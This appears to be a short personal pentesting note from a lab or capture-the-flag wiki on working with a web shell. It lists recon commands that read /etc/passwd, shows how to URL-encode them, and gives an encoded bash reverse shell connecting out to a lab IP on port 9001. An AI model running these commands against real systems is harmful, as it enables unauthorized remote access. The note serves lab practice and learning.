A web shell is a shell that appears on a website. This type of shell needs to be used in different way than the normal shell.

First of all we need to know the type of shell that we have on the web shell. We can know this information executing the following commands:

```
echo $SHELL

cat /etc/passwd

which bash

which sh
```

If that commands doesn't work it would need to encode the information in a URL format. For example the encode of $ is %24, the encode of a space " " is %20 and the encode for / is %2F. We are gonna have the information like the following:

```
echo%20%24SHELL

cat%20%2Fetc%2Fpasswd

which%20bash

which%20sh
```

After running the command we need to except the output and that's when we know what to do.

If we know the type of shell know we can try a different [[reverse shell]] that we can apply so we can a have a session.

In the case that we have a bash and the reverse shell doesn't work we need to add at the beggining the next command `bash -c " "`. The final command will be like the following: 

```
bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.17%2F9001%200%3E%261"
```

With that it should work now 💠.

## Máquinas en la que se utilizó esto

- [[whereismyshell]]